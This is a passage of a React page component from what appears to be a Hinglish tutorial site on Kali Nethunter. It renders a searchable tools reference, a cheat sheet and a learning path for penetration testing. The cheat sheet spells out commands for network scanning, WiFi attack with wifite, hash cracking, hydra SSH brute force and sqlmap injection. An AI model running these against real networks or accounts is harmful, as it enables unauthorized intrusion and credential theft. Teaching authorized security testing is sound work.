    const matchesSearch = tool.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          (tool.description || '').toLowerCase().includes(searchTerm.toLowerCase())
    return matchesCategory && matchesSearch
  })

  const totalPages = Math.ceil(filteredTools.length / TOOLS_PER_PAGE)
  const safePage = Math.min(currentPage, totalPages || 1)
  const paginatedTools = filteredTools.slice((safePage - 1) * TOOLS_PER_PAGE, safePage * TOOLS_PER_PAGE)

  // Reset page when filters change
  useEffect(() => {
    setCurrentPage(1)
  }, [searchTerm, selectedCategory])

  return (
    <TutorialLayout
      title="Tools Reference"
      subtitle="Nethunter ke penetration testing tools ka complete guide"
      icon="🔧"
      prev={{ to: '/payloads', label: 'Payloads & Exploitation' }}
      next={{ to: '/about', label: 'About Nethunter' }}
    >
      <h2>Nethunter Tools Library</h2>
      <p>
        Kali Nethunter mein 600+ security tools hain. Neeche sabse important tools ki list hai jo aapko aani chahiye. Har tool ke saath description aur common commands diye gaye hain. Kisi bhi tool ka naam search karein ya category se filter karein.
      </p>
      <p>
        In tools ko seekhne ka best tarika hai ki aap ek ek karke practice karein. Sabse pehle nmap se shuru karein (network scanning), phir aircrack-ng (WiFi security testing), phir Metasploit (exploitation). Jab basics clear ho jaayein toh advanced tools try karein.
      </p>

      <div className="warning-box mb-8">
        <strong>Educational Purpose Only:</strong> Yeh website keval educational aur authorized security testing ke liye hai. Kisi bhi system ya network par bina permission ke in tools ka istemaal karna illegal hai aur iske liye aap khud zimmedar hain.
      </div>

      {/* Search */}
      <div className="my-6">
        <input
          type="text"
          placeholder="Tools search karein... (jaise wifi, password, network)"
          value={searchTerm}
          onChange={e => setSearchTerm(e.target.value)}
          className="w-full px-4 py-3 bg-dark-800 border border-neon-green/30 rounded-lg text-white font-mono placeholder-gray-600 focus:outline-none focus:border-neon-green transition-colors"
        />
      </div>

      {/* Category Filter */}
      <div className="flex flex-wrap gap-2 mb-8">
        {categories.map(cat => (
          <button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className={`px-3 py-1.5 rounded-lg text-sm font-mono transition-all ${
              selectedCategory === cat
                ? 'bg-neon-green text-dark-900 font-bold'
                : 'bg-dark-700 text-gray-400 hover:text-neon-green border border-dark-600'
            }`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Tools Grid */}
      <div className="space-y-6">
        {paginatedTools.map(tool => (
          <div key={tool.name} className="glass-card p-6">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-xl font-mono font-bold text-neon-green">{tool.name}</h3>
              <span className="px-2 py-0.5 bg-neon-cyan/10 text-neon-cyan text-xs rounded-full font-mono">
                {tool.category}
              </span>
            </div>
            <p className="text-gray-400 text-sm mb-4">{tool.description}</p>
            <CodeBlock
              title="Common Commands"
              code={tool.commands.join('\n')}
            />
            {tool.slug && (
              <Link
                to={`/tool/${tool.slug}`}
                className="mt-4 inline-block px-4 py-2 bg-neon-green/10 border border-neon-green/30 text-neon-green rounded-lg text-sm font-mono hover:bg-neon-green/20 transition-colors"
              >
                Full Guide →
              </Link>
            )}
          </div>
        ))}
      </div>

      {filteredTools.length === 0 && (
        <div className="text-center py-12 text-gray-500">
          <span className="text-4xl">🔍</span>
          <p className="mt-4">"{searchTerm}" se koi tool nahi mila</p>
        </div>
      )}

      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-2 mt-8">
          <button
            onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
            disabled={safePage === 1}
            className="px-3 py-2 bg-dark-800 border border-dark-600 rounded-lg text-gray-400 hover:text-neon-green hover:border-neon-green/30 disabled:opacity-40 disabled:cursor-not-allowed transition-all"
          >
            ← Previous
          </button>
          <div className="flex gap-1">
            {Array.from({ length: Math.min(totalPages, 10) }, (_, i) => {
              const start = Math.max(0, Math.min(safePage - 5, totalPages - 10))
              const pageNum = start + i + 1
              if (pageNum > totalPages) {return null}
              return (
                <button
                  key={pageNum}
                  onClick={() => setCurrentPage(pageNum)}
                  className={`w-9 h-9 rounded-lg text-sm font-mono transition-all ${
                    safePage === pageNum
                      ? 'bg-neon-green text-dark-900 font-bold'
                      : 'bg-dark-800 border border-dark-600 text-gray-400 hover:text-neon-green hover:border-neon-green/30'
                  }`}
                >
                  {pageNum}
                </button>
              )
            })}
          </div>
          <button
            onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
            disabled={safePage === totalPages}
            className="px-3 py-2 bg-dark-800 border border-dark-600 rounded-lg text-gray-400 hover:text-neon-green hover:border-neon-green/30 disabled:opacity-40 disabled:cursor-not-allowed transition-all"
          >
            Next →
          </button>
        </div>
      )}

      <h2 className="mt-12">Quick Command Cheat Sheet</h2>
      <p>
        Yahan kuch sabse common commands ka quick reference hai. Inhe yaad kar lein — exam mein kaam aayenge! Matlab penetration test mein kaam aayenge:
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
        <CodeBlock title="Network Recon (Network Scan)" code={`nmap -sn 192.168.1.0/24    # Devices dhundhein
nmap -sV -sC target         # Services detect karein
masscan 10.0.0.0/8 -p 22   # Fast port scan`} />
        <CodeBlock title="WiFi Attacks (WiFi Hacking)" code={`airmon-ng start wlan0       # Monitor mode
airodump-ng wlan0mon        # Networks scan
wifite                      # Automated attack`} />
        <CodeBlock title="Password Cracking (Password Todna)" code={`john --wordlist=rockyou.txt hash.txt
hashcat -m 0 hash.txt wordlist.txt
hydra -l admin -P pass.txt target ssh`} />
        <CodeBlock title="Web Testing (Website Testing)" code={`nikto -h http://target
gobuster dir -u http://target -w list.txt
sqlmap -u "http://target/?id=1"`} />
      </div>

      <h2 className="mt-12">Tools Kaise Seekhein — Learning Path</h2>
      <p>
        Agar aap beginner hain toh sab tools ek saath mat seekhein. Neeche diye gaye order mein seekhein — har tool pehle wale par based hai:
      </p>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'nmap', desc: 'Network scanning sabse pehle seekhein — yeh foundation hai' },
          { step: '2', title: 'netcat', desc: 'Basic networking concepts samjhein — connections, ports, protocols' },
          { step: '3', title: 'aircrack-ng', desc: 'WiFi hacking seekhein — monitor mode, scanning, cracking' },
          { step: '4', title: 'Wireshark', desc: 'Packet analysis seekhein — traffic ko read karna seekhein' },
          { step: '5', title: 'hydra / john', desc: 'Password attacks seekhein — dictionary aur brute force' },
          { step: '6', title: 'Metasploit', desc: 'Exploitation framework seekhein — payloads, exploits, post-exploitation' },
          { step: '7', title: 'sqlmap / nikto', desc: 'Web application testing seekhain' },
          { step: '8', title: 'bettercap / responder', desc: 'Advanced network attacks — MITM, poisoning' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>
    </TutorialLayout>
  )
}
